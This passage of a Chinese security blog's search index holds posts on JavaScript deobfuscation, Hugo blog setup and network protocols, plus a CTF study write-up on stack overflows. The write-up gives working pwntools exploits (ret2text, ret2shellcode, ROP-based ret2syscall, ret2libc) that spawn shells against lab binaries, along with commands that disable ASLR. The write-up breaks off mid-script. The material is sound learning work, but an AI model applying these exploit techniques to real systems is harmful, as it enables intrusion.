以及浏览器前端中的Source窗口，配合console.log（）函数非常好用。\n目前的需求是，一段经过混淆的恶意代码，能否直接在前端执行出解混淆后的结果。目前认知来看只有编码类混淆可以，而且存在执行到C2的风险。\n","date":"2024-07-05T15:35:25+08:00","permalink":"https://wander1ng.com/post/%E5%B8%B8%E8%A7%81javascript%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86/","section":"post","tags":["技术"],"title":"常见JavaScript混淆与反混淆"},{"categories":null,"contents":"1.首先创建Github库\n2.安装hugo：\nhttps://github.com/gohugoio/hugo/releases 3.下载后记得将hugo.exe路径加入系统环境变量，测试是否安装成功：\nhugo version 4.使用hugo创建博客目录\nhugo new site blogname 5.在系统中创建博客目录，并git init，配置好git的config文件。\n6.选择hugo主题，并使用git clone将主题下载到本地，本网站选择的主题是https://github.com/heyeshuang/hugo-theme-tokiwa.git，第一眼看到便想到莫奈的《日出·印象》。\n7.新建文章\nhugo new post/first-post.md\n8.在hugo网站的根目录下执行hugo进行编译，启动本地预览,打开网址 http://localhost:1313/ 可以进行预览hugo server -D\n9.部署到GitHub\ngit add .\rgit commit -m \u0026#34;xxx\u0026#34;\rgit push https://github.com/username/projectname master(main) 10.在Godaddy或其他网站购买域名\n11.将域名托管到Cloudflare，左边导航栏进入Websites\nadd site\n记得选free plan\n随后在Godaddy设置域名DNS为Cloudflare的DNS服务器地址\n随后等待DNS解析成功，邮箱将会收到邮件通知\n在Cloudflare创建pages并连接到Git，选择最开始在Git中新建的blog目录\n随后博客文件将部署到Cloudflare上\n最后自定义域名，即将域名DNS记录指向Pages\n踩的坑\nHugo server -D的意思是忽略draft=true，即draft属性为true的md文件也会被渲染编译。折磨了一天的问题是“为什么本地能够编译出文章，但是部署到Github上就消失了？”因为实际部署的时候draft=true的文件是不显示的。\n域名的CNAME要解析到项目的别名/Aliases，一键交给Cloudflare添加的CNAME可能不是实际的Aliases，需要手动修改DNS添加上master。\n","date":"2024-06-27T18:02:59+08:00","permalink":"https://wander1ng.com/post/hugo+cloudflare%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8C%87%E5%8D%97/","section":"post","tags":["技术"],"title":"Hugo+CloudFlare搭建博客指南"},{"categories":null,"contents":"学计网的时候有些头大,找到了这篇文章,首先对整体有一个认识,再换一本书,机械工业出版社的《Computer Networking A Top-Down Approach》.\n序 互联网的核心是一系列协议,总称为互联网协议:Internet Protocol Suite.它们对电脑如何连接和组网,做出了详尽的规定.理解了这些协议的规定,就理解了互联网的原理.\n概述 五层模型 自顶向下分别为应用层Application Layer,传输层Transport Layer,网络层Network Layer,链路层Link Layer和物理层Physical Layer.越下面的层越靠近硬件,越上面的层越靠近用户.\n层与协议 每一层都是为了完成某一种功能,为了实现这些功能就要传输时遵循共同的规则protocol.互联网的每一层都定义了很多协议,这些协议的总称为互联网协议.\n物理层 电脑要组网,首先就要先把电脑连接起来,可以用光缆,线缆,双绞线和无线电波等方式(咋和谢希仁版有点不一样?还是我记错了).这就叫做物理层.它主要规定了网络的一些电气特性,作用是负责传输0和1的电信号.\n链路层 定义 单纯的0和1并没有意义,必须规定其解读方式:多少个电信号算一组,每个信号有何意义?链路层的功能就是在实体层的上方确定0和1的分组方式.\n以太网协议 Ethernet规定,一组电信号构成一个数据包叫做帧(Frame).每一帧分为两个部分:标头Head与数据Data.Head包含数据包的一些说明项,如发送者,接收者,数据类型.数据则是数据包的具体内容.\n标头的长度固定为18字节,数据的长度最短为46字节,最长为1500字节.因此对于一帧来说,大小区间为64-1518字节.数据过长则分为多个帧发送.\nMAC地址 传输数据的过程中要标识发送者与接收者,就要使用到MAC地址.Ethernet规定连入网络的所有设备都必须有网卡接口,**数据包必须是从一块网卡传送到另一块网卡.网卡的地址就是数据包的发送地址与接收地址即MAC地址.**每块网卡出场时都有一个唯一的MAC地址,长度为48个二进制位,常用12个16进制数表示.前6个位厂商编号,后六个为该厂商网卡流水号.\n广播 一块网卡要知道另一块网卡的MAC地址,要使用到ARP协议(在谢希仁版中自学过,现在又给忘了\u0026hellip;);\n知道MAC地址之后,系统怎样才能把数据包准确送到接收方?**Ethernet并不把数据包准确送到接收方,而是向本网络所有计算机发送,让计算机自己判断是否为接收方.**而向本网络所有计算机发包的行为,就叫做广播broadcasting.\n网络层 网络层的由来 根据Ethernet协议,依靠MAC地址发送数据,理论上和技术上世界上任何一个地方的网卡都能够找到任何一个地方的网卡.但是这样做有一个巨大的缺点\u0026quot;以太网采用广播的方式发送数据包,每个成员都会收到所有的包.不仅效率低,而且只能在发送者的子网络中传播.(如果互联网上每一台计算机都收到所有的包不可想象).\n所以必须找到一种方法,能够区分MAC地址是否属于一个子网络.如果属于一个子网络,采用广播的形式发送,否则采用路由(路由即向不同的子网络分发数据包).而MAC地址只与厂商有关与网络无关,所以网络层诞生了.\n它的作用是引进一套新的地址,使我们能够区分不同的计算机是否属于一个子网络.\n于是网络层出现后,每台计算机就有了两种地址,一种是MAC地址,另一种是网络地址(二者之间无任何联系).网络地址帮助我们确定计算机所在的子网络,MAC地址则将数据包送到该子网络的目标网卡.所以从逻辑上看一定是先处理网络地址,再处理MAC地址.\nIP协议 根据网络地址的协议就叫做IP协议,其定义的地址就叫做IP地址.IP地址由网络号和主机号组成.处于一个子网络的电脑,其IP地址的网络部分必定是相同的.主机部分是对同处该子网的主机进行编号.\n为了从IP地址判断出两台计算机是否处于同一个子网,就要用到另一个参数\u0026quot;子网掩码\u0026ldquo;即subnet mask.子网掩码使表示子网特征的一个参数,在形式上等同于IP地址,也是一个32位二进制数字.其网络部分全为1,主机部分全为0.\n知道IP地址与子网掩码判断是否属于同一个子网的方法:将两个IP地址分别于子网掩码进行AND运算,结果相同则在一个子网.\n已知IP地址172.16.154.1和172.16.254.233子网掩码都是255.255.255.0,请问其是否在一个子网?\n总结IP协议的作用:一是为每台计算机分配IP地址,另一个是为确定哪些地址处于一个子网.\nIP数据报 根据IP协议发送的数据,就叫做IP数据报.但是Ethernet数据报只包含MAC地址,并没有IP地址的栏位,是否要修改数据报定义,再添加一个栏位?回答是不需要,因为可以直接将IP数据报放进Ethernet数据报的数据部分.这就是互联网分层结构的好处:上层变动完全不涉及下层结构.\nIP数据报的标头(特指不在Head中而在Data中的关于IP信息的Head)长度一般在20-60字节,整个数据报的长度最大为65535字节.Ethernet数据报的数据部分,最长只有1500字节,所以如果IP数据报超过了1500字节,就要分割成几个Ethernet数据报分开发送.\nARP协议 IP数据报是放在以太网数据报里发送的.所以必须同时知道两个地址,一个是对方的MAC地址,一个是对方的IP地址.通常情况下对方的IP地址是已知的,但是MAC地址未知.所以需要一种基址从IP地址得到MAC地址.\n第一种情况,两个主机不在一个子网,则事实上无法得到对方的MAC地址,只能将数据包传送到两个子网连接处的网关,让网关进行处理.\n第二种情况,两个主机在一个子网,则使用ARP协议.ARP协议发出一个数据报,其中包含所要查询的IP地址,在对方的MAC地址这一栏,填的是FF:FF:FF:FF:FF:FF,表示这是一个广播地址.他所在的子网络的每一台主机,都会收到这个数据报.从中取出IP地址,与自身IP地址进行比较,如果两者相同,则做出回复向对方报告MAC地址,否则就丢弃这个包.\n传输层 有了MAC地址和IP地址,就可以在互联网上任意两台主机建立通信.但是同一台主机上有许多程序都要使用到网络,那么就需要一个参数来表示这个数据包到底供哪个进程使用,这个参数就叫做端口.它其实是每一个使用网卡的程序的编号,每个数据报都发送到主机的特定端口,这样不同的程序就能够取到自己所需要的数据.\n端口是0到65535之间的一个整数,正好16个二进制位.0到1023的端口被系统占用,用户只能选择大于1023的端口.\n传输层的功能是建立端口到端口之间的通信,相比之下网络层是建立主机到主机之间的通信.只要确定主机和端口,就能实现程序之间的交流.因此Unix就把主机+端口,叫做\u0026quot;套接字\u0026quot;socket.\nUDP协议 现在我们要在数据报中加入端口信息,这就需要新的协议.最简单的实现叫做UDP协议,它的格式就是在数据前面加上端口号.\nHead部分主要定义了发出端口与接收接口,其数据报非常简单,Head部分8个字节,总长度不超过65535字节,正好放进一个IP数据报.数据部分就是具体的内容然后把整个UDP数据报放入IP数据报的数据部分.所以整个Ethernet数据报变成了下面这样:\nTCP协议 UDP协议的优点在于比较简单,容易实现.但是缺点在于一旦数据报发出,无法知道对方是否知道.为了提高网络可靠性,TCP协议就诞生了.这个协议非常复杂,但可以近似认为它是有确认机制的.因此TCP协议能够确保数据不会丢失,但是实现困难,资源消耗较多.\nTCP数据报和UDP数据报一样,都是内嵌在IP数据报的数据部分.TCP数据报没有长度限制,理论上可以无限长.但是为了保证网络的效率,通常TCP数据报的长度不会超过IP数据报的长度,确保单个TCP数据报不必再被分割.\n应用层 应用程序收到传输层的数据,接下来就要进行解读.由于互联网是开放架构,所以必须先规定好格式.**应用层的作用,就是规定应用程序的数据格式.**举例来说,TCP协议可以为各种各样的程序传递数据,Email/WWW/FTP等,必须有不同协议规定电子邮电,网页和FTP数据的格式,这些应用程序协议就构成了应用层.这是最高的一层,直接面对用户.其数据就在TCP数据报的数据部分,因此现在的Ethernet变成了下面这样:\n网络通信的实质就是交换上面的数据报.\n对于不在一个子网的两台计算机之间的通信(假设1号电脑要向4号电脑发送数据报),则1号电脑需要知道网关A的MAC地址(和4号电脑的IP地址).1号电脑发出数据报到网关A,网关A通过路由协议发现4号电脑位于网络B,又把数据报发给网关B,B再转发到4号电脑.\n判断是否处于同一子网的方法 静态IP地址 本机IP地址,子网掩码,网关IP地址,DNS的IP地址是TCP/IP协议的重要参数,通俗来说知道它们就可以上网.由于它们是给定的,计算机每次开机都分配到相同的IP地址,所以这种方法被称作静态IP地址上网.\n但是出于简便性,并且避免IP地址无法灵活变更,大多数用户使用\u0026quot;动态IP上网\u0026rdquo;.\n动态IP地址 计算机开机后会自动分配到一个IP地址,不用人为设定,它们使用的协议叫做DHCP协议.该协议规定每个子网中都有一台计算机负责管理本网络的所有IP地址,叫做DHCP服务器.新的计算机加入网络,必须向DHCP服务器发送一个DHCP请求数据报,申请IP地址和相关的网络参数.(指定管理IP地址的DHCP服务器未开机怎么办????)\n新加入的计算机不知道不同子网计算机的MAC地址和IP地址,如何发送数据报?DHCP协议作出了巧妙规定:\n由于DHCP是一种建立在UDP协议基础上的应用层协议,所以整个数据报长这个样子:\n最前面的Ethernet Head,设置发出方的MAC地址和接收方(DHCP服务器)的MAC地址,前者就是本机网卡的MAC地址,后者此时不知道,填入广播地址FF:FF:FF:FF\n后面的IP Head,设置发出方的IP地址和接收方的IP地址,这时对于这两者本机都不知道,于是发出方的IP地址设为0.0.0.0,接收方IP地址设为255.255.255.255\n最后的UDP Head,设置发出方的端口和接收方的端口.DHCP协议规定发出方是port 68,接收方是port 67.\n这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道”这个包是发给我的”，而其他计算机就可以丢弃这个包。\n接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个”DHCP响应”数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数。\n实例 假设网络参数如下:\n本机IP:192.168.1.100,子网掩码255.255.255.0,网关IP:192.168.1.1,DNS的IP地址:8.8.8.8\n然后打开了Google Chrome,输入了www.google.com,接下来浏览器将要向Google发送一个网页请求数据报.\nDNS协议 发送数据报就要知道对方的IP地址,我么可以通过DNS协议将网址转换为IP地址.已知DNS服务器为8.8.8.8,于是向其发送DNS数据报(port 53):\n之后DNS服务器做出响应,告诉我们Google服务器的IP地址172.194.72.105.\n子网掩码 得到IP地址后要通过子网掩码来判断改IP是否在同一个子网,以确定要不要向网关发包.将子网掩码与自己的IP地址和Google的IP地址进行AND运算,发现结果不相等,所以不在一个子网.所以我们要向Google发送数据报,必须通过网关192.168.1.1转发,也就是说接收方的IP地址将是网关的MAC地址.\n应用层协议 浏览网页用到的是HTTP协议,它的数据报长下面这个样子:\nGET / HTTP/1.1 Host: www.google.com Connection: keep-alive User-Agent: Mozilla/5.0 (Windows NT 6.1) …… Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Encoding: gzip,deflate,sdch Accept-Language: zh-CN,zh;q=0.8 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3 Cookie: … …\n被嵌在TCP数据报之中,假定为4960字节.\nTCP协议 TCP数据报需要设置端口,接收方的HTTP默认端口是80,而发送方的端口是1024-65535之间随机确定的. 假定为51775.TCP数据报的Head长为20字节,加上嵌入HTTP的数据报,总长度变为4980字节.\nIP协议 然后TCP数据报再嵌入IP数据报,IP数据报需要设置双方的IP地址,这是已知的.发送方是192.168.1.100（本机），接收方是172.194.72.105（Google）。IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。\nEthernet协议 最后IP数据报嵌入以太网数据报,以太网数据报设置双方的MAC地址,发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。\n以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。\n服务器端响应 经过多个网关转发,Google服务器收到了这四个以太网数据报.根据IP Head的序号,Google将四个包拼接起来,取出完整的TCP数据,根据其中的HTTP请求作出HTTP响应,再用TCP协议发回.本机收到HTTP响应后,就可以将网页显示出来,完成一次网络通信.\n","date":"2020-07-16T15:24:35+08:00","permalink":"https://wander1ng.com/post/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8/","section":"post","tags":["技术"],"title":"互联网协议入门"},{"categories":null,"contents":"从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。\n0X01\u0026ndash;栈溢出的基本原理：\n栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。\n函数调用指令: CALL(注意理解EBP的变化过程，它指向下一条指令要操作的数据)\n大致过程:\n参数入栈 返回地址入栈 代码区块跳转 栈帧调整:\n保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈) 将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部) 给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶) 0X02\u0026ndash;栈溢出的保护类型：\n知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。\nCanary：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \\x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。编译时的关闭指令：-fno-stack-protector\nALSR与PIE(Position Independent Executable)：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功） 编译时ALSR的关闭指令：echo 0\u0026gt; /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态，可以用cat+路径显示相关的参数： 0 - 表示关闭进程地址空间随机化。 1 - 表示将mmap的基址，stack和vdso页面随机化。 2 - 表示在1的基础上增加栈（heap）的随机化。\nPIE编译时的关闭指令：-no-pie，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。\nLinux平台下的NX,Windows平台上的DEP：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。\n0X03\u0026ndash;编译指令：\ngcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie）\nsudo -s echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\n($ cat /proc/sys/kernel/randomize_va_space指令检查) exit（关闭ALSR) -z execstack（关闭NX保护）\ntest.c -o test(由test.c生成test可执行文件)\n-g(GDB调试)\n0X04\u0026ndash;ROP原理：\n随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：\n程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 ropgadget，注意命令格式：ROPgadget \u0026ndash;binary [文件名] \u0026ndash;only’寄存器名|寄存器名’ | grep ‘eax’。\n0X05\u0026ndash;四种类型：\n第一种类型ret2text:\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\rvoid success() { puts(“You Hava already controlled it.”); }\rvoid vulnerable()\r{\rchar s[12];\rgets(s);\rputs(s);\rreturn;\r}\rint main(int argc, char **argv) {\rvulnerable();\rreturn 0;\r} 只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。\nEXP如下：\n##coding=utf8\r## 导入pwntools库\rfrom pwn import *\r## 构造与程序交互的对象，sh = process(\u0026#39;./文件名\u0026#39;)表示打本地，日自己。\rsh = process(\u0026#39;./stack_example\u0026#39;)\r## 已知了想要执行的函数地址\rsuccess_addr = 0x0804843b\r## 构造payload\rpayload = \u0026#39;a\u0026#39; * 0x14 + \u0026#39;bbbb\u0026#39; + p32(success_addr)\r##print可以帮助自己看脚本执行到了哪一步\rprint p32(success_addr)\r## 向程序发送字符串\rsh.sendline(payload)\r## 将代码交互转换为手工交互\rsh.interactive() int __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(_bss_start, 0, 1, 0);\rputs(\u0026#34;There is something amazing here, do you know anything?\u0026#34;);\rgets((char *)\u0026amp;v4);\rprintf(\u0026#34;Maybe I will tell you next time !\u0026#34;);\rreturn 0;\r} 首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system(\u0026quot;/bin/sh\u0026quot;)的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。\n.text:080486A7 lea eax, [esp+1Ch]\r.text:080486AB mov [esp], eax ; s\r.text:080486AE call _gets 由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。\ngef➤ b *0x080486AE\rBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\rgef➤ r\rThere is something amazing here, do you know anything?\rBreakpoint 1, 0x080486ae in main () at ret2text.c:24\r24 gets(buf);\r───────────────────────────────────────────────────────────────────────[ registers ]────\r$eax : 0xffffcd5c → 0x08048329 → \u0026#34;__libc_start_main\u0026#34;\r$ebx : 0x00000000\r$ecx : 0xffffffff\r$edx : 0xf7faf870 → 0x00000000\r$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → \u0026#34;__libc_start_main\u0026#34;\r$ebp : 0xffffcdc8 → 0x00000000\r$esi : 0xf7fae000 → 0x001b1db0\r$edi : 0xf7fae000 → 0x001b1db0\r$eip : 0x080486ae → \u0026lt;main+102\u0026gt; call 0x8048460 \u0026lt;gets@plt\u0026gt; 断点下在Call处**为什么是这个Call处？**(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。\n每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。\nEXP如下：\n##!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2text\u0026#39;)\rtarget = 0x0804863a\rsh.sendline(\u0026#39;A\u0026#39; * (0x6c+4) + p32(target))\rsh.interactive() 上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。\n第二种类型ret2shellcode：\nret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;No system for you this time !!!\u0026#34;);\rgets((char *)\u0026amp;v4);\rstrncpy(buf2, (const char *)\u0026amp;v4, 0x64u);\rprintf(\u0026#34;bye bye ~\u0026#34;);\rreturn 0;\r} 程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。\n.bss:0804A080 public buf2\r.bss:0804A080 ; char buf2[100] 通过vmmap观察该bss段是否可执行：\ngef➤ b main\rBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.\rgef➤ r\rStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:8\r8 setvbuf(stdout, 0LL, 2, 0LL);\r─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────\r6 int main(void)\r7 {\r→ 8 setvbuf(stdout, 0LL, 2, 0LL);\r9 setvbuf(stdin, 0LL, 1, 0LL);\r10 ─────────────────────────────────────────────────────────────────────[ trace ]────\r[#0] 0x8048536 → Name: main()\r─────────────────────────────────────────────────────────────────────────────────────────────────────\rgef➤ vmmap Start End Offset Perm Path\r0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\r0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\r0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\r0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\r0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]\r0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\r0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\r0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\r0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\r0xfffdd000 0xffffe000 0x00000000 rwx [stack] 所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。\nEXP如下:\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2shellcode\u0026#39;)\r## 自动生成shellcode\rshellcode = asm(shellcraft.sh())\rbuf2_addr = 0x804a080\r## shellcode先放入，剩余的再用\u0026#39;A\u0026#39;填充至112长度。\rsh.sendline(shellcode.ljust(112, \u0026#39;A\u0026#39;) + p32(buf2_addr))\rsh.interactive() 第三种类型：ret2syscall： 即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。\nexecve(\u0026#34;/bin/sh\u0026#34;,NULL,NULL) 由于该程序是 32 位，所以我们需要使得\n系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。\n具体实现\u0026ndash;ropgadgets 这个工具:\nonly ‘pop|ret’ | grep \u0026rsquo;eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(\u0026quot;/bin/sh\u0026quot;,NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。\n平凡无奇的存在栈溢出漏洞的程序源码如下：\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;This time, no system() and NO SHELLCODE!!!\u0026#34;);\rputs(\u0026#34;What do you plan to do?\u0026#34;);\rgets(\u0026amp;v4);\rreturn 0;\r} 想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。\n此外，我们需要获得 /bin/sh 字符串对应的地址。\n➜ ret2syscall ROPgadget --binary rop --string \u0026#39;/bin/sh\u0026#39; Strings information\r============================================================\r0x080be408 : /bin/sh 以及int 0x80的地址：\n➜ ret2syscall ROPgadget --binary rop --only \u0026#39;int\u0026#39; Gadgets information\r============================================================\r0x08049421 : int 0x80\r0x080938fe : int 0xbb\r0x080869b5 : int 0xf6\r0x0807b4d4 : int 0xfc\rUnique gadgets found: 4 EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./rop\u0026#39;)\r## 找到的gadgets及其地址\rpop_eax_ret = 0x080bb196\rpop_edx_ecx_ebx_ret = 0x0806eb90\rint_0x80 = 0x08049421\rbinsh = 0x80be408\r## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。\rpayload = flat([\u0026#39;A\u0026#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\rsh.sendline(payload)\rsh.interactive() payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。\n第四种类型：ret2libc\nlibc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system(\u0026quot;/bin/sh\u0026quot;).\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(_bss_start, 0, 1, 0);\rputs(\u0026#34;RET2LIBC \u0026gt;_\u0026lt;\u0026#34;);\rgets((char *)\u0026amp;v4);\rreturn 0;\r} 确定存在栈溢出漏洞,用IDA找到了system函数,用ropgadget查找到\u0026quot;/bin/sh\u0026quot;。\n则EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2libc1\u0026#39;)\rbinsh_addr = 0x8048720\rsystem_plt = 0x08048460\rpayload = flat([\u0026#39;a\u0026#39; * 112, system_plt, \u0026#39;b\u0026#39; * 4, 